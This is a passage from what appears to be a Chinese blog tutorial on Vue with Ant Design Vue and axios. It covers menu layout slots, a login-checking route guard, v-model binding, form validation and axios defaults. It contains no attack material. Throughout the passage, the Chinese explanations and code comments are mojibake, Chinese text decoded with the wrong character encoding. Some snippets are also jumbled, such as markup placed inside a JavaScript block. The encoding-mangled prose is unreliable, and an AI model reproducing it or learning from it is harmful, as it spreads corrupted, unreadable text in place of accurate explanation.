class="attr">key</span>=<span class="string">&quot;9&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;setting&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;setting&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>ç³»ç»Ÿè®¾ç½®<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;10&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showModal&quot;</span>&gt;</span>        </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;login&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> &gt;</span>ç™»å‡º<span class="tag">&lt;/<span class="name">span</span>&gt;</span> </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-modal</span> <span class="attr">v-model</span>=<span class="string">&quot;visible&quot;</span> <span class="attr">title</span>=<span class="string">&quot;Basic Modal&quot;</span> @<span class="attr">ok</span>=<span class="string">&quot;handleOk&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>æ˜¯å¦ç¡®å®šç™»å‡ºï¼Ÿ<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-modal</span>&gt;</span>        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-menu</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout-sider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-header</span> <span class="attr">theme</span>=<span class="string">dark</span> &gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-header</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- ä¸Šé¢æ˜¯åœ¨å¯¼èˆªæ æœ€é¡¶ç«¯åŠ ä¸œè¥¿ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-content</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0 16px&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-content</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-footer</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">        Ant Design Â©2018 Created by Ant UED</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨Vueå½“ä¸­ï¼Œè¿™ä¸ªç›¸å½“äºä¸€ä¸ªæ’æ§½ï¼Œä¹Ÿå°±æ˜¯ï¼Œå‘ƒï¼Œç±»ä¼¼ä¸€ä¸ªincludeå‡½æ•°ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦æŠŠä»–å½“ä½œæ¨¡æ¿çš„è¯å°±éœ€è¦è¿™æ ·å†™ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„report.vue</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> menus <span class="keyword">from</span> <span class="string">&#x27;../commons/menu&#x27;</span></span><br><span class="line"></span><br><span class="line">&lt;menu&gt;&lt;/menu&gt;</span><br><span class="line"><span class="comment">//åœ¨ä¸‹é¢å¯¼å…¥ï¼Œä¹‹åå†htmlå½“ä¸­ä½¿ç”¨å³å¯</span></span><br><span class="line">components:&#123;</span><br><span class="line">        menus,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="6-è·¯ç”±å®ˆå«"><a href="#6-è·¯ç”±å®ˆå«" class="headerlink" title="6.è·¯ç”±å®ˆå«"></a>6.è·¯ç”±å®ˆå«</h2><p>æˆ‘ä»¬å‰ç«¯è‚¯å®šæ˜¯è¦é‰´æƒçš„å§ï¼Œä¸ç„¶ç”¨æˆ·å°±å¯å¯¹å‰ç«¯ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œæ•…æˆ‘ä»¬æ„é€ ä¸€ä¸ªå±€éƒ¨å®ˆå«æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeRouteEnter</span>(<span class="params">to,<span class="keyword">from</span>,next</span>)</span> &#123;</span><br><span class="line">            axios.post(<span class="string">&#x27;/report&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (res.data == <span class="number">0</span>) next(&#123; <span class="attr">path</span>:<span class="string">&#x27;/&#x27;</span> &#125;);</span><br><span class="line">              <span class="keyword">else</span> next();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ï¼Œå†è®¿é—®è¯¥è·¯ç”±ï¼Œç¦»å¼€è·¯ç”±çš„æ—¶å€™éƒ½ä¼šå…ˆè®¿é—®ä¸€æ¬¡é¡µé¢ï¼Œæˆ‘ä»¬åç«¯å†™å¥½ä»£ç ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»é™†çš„è¯ï¼Œå°±ä¼šè¿”å›åˆ°indexé¡µé¢äº†ã€‚</p>
<h2 id="7-æœŸå¾…å€¼"><a href="#7-æœŸå¾…å€¼" class="headerlink" title="7.æœŸå¾…å€¼"></a>7.æœŸå¾…å€¼</h2><p>è¿™ä¸ªç†è§£èµ·æ¥å•é å˜´è¯´è¾ƒä¸ºåƒµç¡¬ï¼Œéœ€è¦å®æˆ˜ä¸­ä½¿ç”¨æ‰å¯ä»¥é¢†æ‚Ÿçš„æ¸…æ¥šï¼Œæ¯”å¦‚æˆ‘ä»¬çš„htmlä»£ç ä¸­æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;ExportSavePdf(htmlTitle,nowTime)&quot;</span>&gt;</span>æŠ¥å‘Šç”Ÿæˆ<span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ï¼ˆé€šè¿‡Vueæ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨@clickçš„æ–¹æ³•æ¥å¤„ç†å„ç§äº‹ä»¶ï¼Œä¹‹åå¡«å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å†™å…¥å‡½æ•°çš„å®å‚ï¼Œè€Œå®å‚ä¸ä¸€å®šæ˜¯ä¸€å®šå‡ºç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å®å‚å¯èƒ½ä¼šå‡ºç°ä¸ºnullçš„æƒ…å†µï¼Œè€ŒVueä¸æƒ³å‡ºç°è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥è¦æ±‚æˆ‘ä»¬å¡«å…¥é»˜è®¤å€¼ï¼Œä¹Ÿå°±æ˜¯æœŸå¾…å€¼ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰å¡«å…¥å‚æ•°çš„æ—¶å€™è‡ªåŠ¨å¡«å…¥çš„å‚æ•°</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      data,</span><br><span class="line">      columns,</span><br><span class="line">      htmlTitle: <span class="string">&#x27;report&#x27;</span>,</span><br><span class="line">      keyName: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="8-è®¾ç½®é»˜è®¤å€¼"><a href="#8-è®¾ç½®é»˜è®¤å€¼" class="headerlink" title="8.è®¾ç½®é»˜è®¤å€¼"></a>8.è®¾ç½®é»˜è®¤å€¼</h2><p>æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³åœ¨ç”¨æˆ·è®¿é—®ä¹‹å‰çš„æ—¶å€™ç›´æ¥è·å–æ•°æ®ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥æ‹¿åˆ°æ•°æ®äº†ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    <span class="comment">// this.drawChart();</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥è¿™ç§æ–¹å¼å¡«å…¥çš„å€¼ï¼Œå½“ç”¨æˆ·è®¿é—®é¡µé¢çš„æ—¶å€™ä¾¿ä¼šè‡ªåŠ¨è¿›è¡Œè°ƒç”¨ã€‚ä¾‹å­ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&#x27;/setting&#x27;</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.usersData(res.data);</span><br><span class="line">      <span class="comment">// location.reload()</span></span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(err)</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-å®ç°ç›‘å¬æ•°æ®"><a href="#9-å®ç°ç›‘å¬æ•°æ®" class="headerlink" title="9.å®ç°ç›‘å¬æ•°æ®"></a>9.å®ç°ç›‘å¬æ•°æ®</h2><p>åœ¨ä¹‹å‰çš„layuiçš„æ—¶å€™ï¼Œå› ä¸ºæˆ‘ä¸ä¼šå¯¹æ•°æ®è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥å¾€å¾€é€ æˆè‡ªå·±è¦å†™å¾ˆå¤šçš„type=hidenï¼Œæˆ–è€…å¿…é¡»æ„é€ formè¡¨å•çš„æƒ…å†µï¼Œè€Œä½¿ç”¨æ¡†æ¶ä¹‹åå¯ä»¥é€šè¿‡v-modelæ“ä½œç®€å•çš„å®ç°è¿™ä¸ªæ•ˆæœï¼Œ</p>
<p>ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a-form-model-item style=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span><br><span class="line">                            &lt;a-input  type=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;logKey&quot;</span> v-model=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span><br><span class="line">                                &lt;a-icon slot=<span class="string">&quot;prefix&quot;</span> type=<span class="string">&quot;lock&quot;</span> style=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span><br><span class="line">                            &lt;/a-input&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    &lt;a-form-model-item <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span><br><span class="line">                      &lt;a-button</span><br><span class="line">                            type=<span class="string">&quot;primary&quot;</span></span><br><span class="line">                            html-type=<span class="string">&quot;submit&quot;</span></span><br><span class="line">                            @click=<span class="string">&quot;selectAddress($event)&quot;</span></span><br><span class="line">                        &gt;</span><br><span class="line">                            æ·»åŠ </span><br><span class="line">                        &lt;/a-button&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨JSä»£ç ä¸­ï¼š</span></span><br><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘å¹¶æ²¡æœ‰å†™formè¡¨å•ï¼Œè€Œæˆ‘ä¾ç„¶å¯ä»¥å®ç°æäº¤æ•°æ®ï¼Œæ˜¯å› ä¸ºä½¿ç”¨v-modelç›‘å¬ä¹‹åï¼Œè¯¥inputè¾“å…¥æ¡†çš„å†…å®¹è¢«JSå®æ—¶ç›‘æ§ç€ã€‚</p>
<h2 id="10-ç›‘å¬çš„å¦™ç”¨"><a href="#10-ç›‘å¬çš„å¦™ç”¨" class="headerlink" title="10.ç›‘å¬çš„å¦™ç”¨"></a>10.ç›‘å¬çš„å¦™ç”¨</h2><p>åˆ©ç”¨ç›‘å¬ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„å®Œæˆå¯¹ä¸€äº›çœ‹èµ·æ¥å¾ˆé…·ç‚«çš„ç‰¹æ•ˆï¼Œæ¯”å¦‚ï¼Œå¦‚æœç”¨æˆ·æƒ³è¦æäº¤ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®ï¼Œå°±éœ€è¦å¡«å†™å‡ ä¸ªinputæ¡†ï¼Œå¹¶ä¸”å¦‚æœæ¡†æ˜¯ç©ºçš„ï¼Œè¿˜å¯ä»¥ç»™å‡ºæç¤ºç­‰ç­‰ï¼Œè¿™é‡Œä¸¾å‡ºä¸€ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ç”¨æˆ·ååˆ¤æ–­ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span> <span class="attr">:validate-status</span>=<span class="string">&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">:help</span>=<span class="string">&quot;userNameError() || &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-decorator</span>=<span class="string">&quot;[</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#x27;userName&#x27;,</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;,</span></span></span><br><span class="line"><span class="tag"><span class="string">        ]&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;user&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¡ºä¾¿ä¸€æï¼Œ ç”¨:å¼•å·å†™å…¥çš„ä¸œè¥¿ï¼Œä¸€èˆ¬æˆ‘ä»¬æ˜¯ç”¨äºæ¡ä»¶åˆ¤æ–­ï¼Œæ¯”å¦‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå»åˆ¤æ–­userNameErrorçš„çŠ¶å†µ</p>
<p>åœ¨methodså½“ä¸­ï¼Œæˆ‘ä»¬æ„é€ å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">userNameError</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">     <span class="keyword">const</span> &#123; getFieldError, isFieldTouched &#125; = <span class="built_in">this</span>.form;</span><br><span class="line">     <span class="keyword">return</span> isFieldTouched(<span class="string">&#x27;userName&#x27;</span>) &amp;&amp; getFieldError(<span class="string">&#x27;userName&#x27;</span>);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p>åœ¨dataå½“ä¸­ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      hasErrors,</span><br><span class="line">      form: <span class="built_in">this</span>.$form.createForm(<span class="built_in">this</span>, &#123; <span class="attr">name</span>: <span class="string">&#x27;getWebsocket&#x27;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹æ˜¯å¦‚ä¸‹è§£é‡Šçš„ï¼š</p>
<p>v-decorator æ˜¯ Ant Design çš„æ§ä»¶éªŒè¯å±æ€§ã€‚</p>
<p>ç»è¿‡ <code>getFieldDecorator</code> æˆ– <code>v-decorator</code> åŒ…è£…çš„æ§ä»¶ï¼Œè¡¨å•æ§ä»¶ä¼šè‡ªåŠ¨æ·»åŠ  <code>value</code>ï¼ˆæˆ– <code>valuePropName</code> æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ <code>onChange</code>ï¼ˆæˆ– <code>trigger</code> æŒ‡å®šçš„å…¶ä»–å±æ€§ï¼‰ï¼Œæ•°æ®åŒæ­¥å°†è¢« Form æ¥ç®¡ï¼Œè¿™ä¼šå¯¼è‡´ä»¥ä¸‹ç»“æœï¼š</p>
<p>ä½ ä¸å†éœ€è¦ä¹Ÿä¸åº”è¯¥ç”¨ <code>onChange</code> æ¥åšåŒæ­¥ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç»§ç»­ç›‘å¬ <code>onChange</code> ç­‰äº‹ä»¶ã€‚</p>
<p>ä½ ä¸èƒ½ç”¨æ§ä»¶çš„ <code>value defaultValue</code> ç­‰å±æ€§æ¥è®¾ç½®è¡¨å•åŸŸçš„å€¼ï¼Œé»˜è®¤å€¼å¯ä»¥ç”¨ <code>getFieldDecorator</code> æˆ– <code>v-decorator</code> é‡Œçš„ initialValueã€‚</p>
<p>ä½ ä¸åº”è¯¥ç”¨ <code>v-model</code>ï¼Œå¯ä»¥ä½¿ç”¨ <code>this.form.setFieldsValue</code> æ¥åŠ¨æ€æ”¹å˜è¡¨å•å€¼ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´è¿™ç§æ–¹å¼æ˜¯å§formç”±Vueå½»åº•æ‰˜ç®¡äº†~å’Œä¹‹å‰çš„ä¸åŒï¼Œä¼šè‡ªåŠ¨åˆ¤æ–­æ˜¯å¦å­˜åœ¨å€¼ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°†ä¼šè°ƒç”¨v-decoratorã€‚å½“ç„¶è¿™ç§æ–¹å¼æˆ‘æ˜¯æ¯”è¾ƒæ¨¡ç³Šçš„ï¼ŒçœŸè¦è¯´æˆ‘æ¯”è¾ƒç†è§£çš„æ˜¯å¦å¤–ä¸€ä¸ªå½¢å¼</p>
<h2 id="11-v-modelçš„å¦™ç”¨"><a href="#11-v-modelçš„å¦™ç”¨" class="headerlink" title="11.v-modelçš„å¦™ç”¨"></a>11.v-modelçš„å¦™ç”¨</h2><p>åœ¨htmlå½“ä¸­å†™ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="attr">class</span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a-input</span>  <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;logKey&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;lock&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">class</span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">a-button</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">html-type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">                            @<span class="attr">click</span>=<span class="string">&quot;selectAddress($event)&quot;</span></span></span><br><span class="line"><span class="tag">                        &gt;</span></span><br><span class="line">                            æ·»åŠ </span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a-alert</span> <span class="attr">message</span>=<span class="string">&quot;è¾“å…¥keyï¼Œå³å¯è‡ªåŠ¨æº¯æº&quot;</span> <span class="attr">type</span>=<span class="string">&quot;info&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fontKey&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">a-spin</span> <span class="attr">size</span>=<span class="string">&quot;large&quot;</span> <span class="attr">class</span>=<span class="string">&quot;spinner&quot;</span> <span class="attr">:spinning</span>=<span class="string">&quot;spinning&quot;</span> <span class="attr">:delay</span>=<span class="string">&quot;delayTime&quot;</span> /&gt;</span></span><br><span class="line">                  </span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œçš„spinningï¼Œæˆ‘ä»¬ç»™å¥¹è¿›è¡Œæ‰˜ç®¡ï¼Œå¦‚æœå¯ä»¥çš„è¯ï¼Œè€Œspinningçš„æœŸæœ›é»˜è®¤å€¼åœ¨dataå½“ä¸­æ„é€ ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">    return&#123;</span><br><span class="line">    attackAddressName:&#x27;&#x27;,</span><br><span class="line">    spinning: false,</span><br><span class="line">    delayTime: 500,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>è€Œå½“æˆ‘ä»¬ç‚¹å‡»æŒ‰é’®å‘é€æ•°æ®ä¹‹åï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€æ—¦æ•°æ®æˆåŠŸå‘é€è¿‡å»ï¼Œæˆ‘ä»¬å°±å°†spinningçš„å€¼æ”¹æˆtrueï¼Œè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºäº†ï¼Œå½“è·å–æ•°æ®ä¹‹åï¼Œæˆ‘ä»¬å°±æ”¹æˆfalseï¼Œè®©ä»–æ¶ˆå¤±å³å¯</p>
<h1 id="axios-part"><a href="#axios-part" class="headerlink" title="axios part"></a>axios part</h1><h2 id="1-aioxå‘é€æ•°æ®"><a href="#1-aioxå‘é€æ•°æ®" class="headerlink" title="1.aioxå‘é€æ•°æ®"></a>1.aioxå‘é€æ•°æ®</h2><p>axiosæ˜¯ä¸€ä¸ªç»„ä»¶ï¼Œç”¨äºå‘é€æ•°æ®ç»™åç«¯ï¼Œç›¸å½“å¥½ç”¨ï¼Œæˆ‘ä»¬ä¸ºäº†é™ä½ä»£ç è€¦åˆæ€§ï¼Œåº”è¯¥æŠ“é—¨å»ºç«‹ä¸€ä¸ªaxiosæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”è®¾ç½®ä¸€ä¸ªhttp.jsï¼Œå„ç§å„æ ·çš„è®¾ç½®æˆ‘ä»¬éƒ½åœ¨axioså½“ä¸­è¿›è¡Œé…ç½®å³å¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line"></span><br><span class="line">axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;</span><br><span class="line">axios.defaults.timeout = 1000000;</span><br><span class="line">axios.defaults.withCredentials = true</span><br></pre></td></tr></table></figure>



<p>ä¾‹å¦‚è¿™æ ·ï¼Œå°±æ˜¯è®¾ç½®äº†é»˜è®¤çš„urlï¼Œè®¾ç½®è¶…æ—¶äº‹ä»¶ï¼Œå¸¦ä¸Šcookiesç­‰ç­‰ï¼Œè€Œaxiosçš„ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&quot;/login&quot;</span>,formData,config).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">res.data == <span class="number">0</span> </span>)</span>&#123;</span><br><span class="line">         alert(<span class="string">&quot;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="built_in">this</span>.$message.success(<span class="string">` login successfully!`</span>);</span><br><span class="line">          router.push(&#123; <span class="attr">path</span>:<span class="string">&quot;/upload&quot;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> 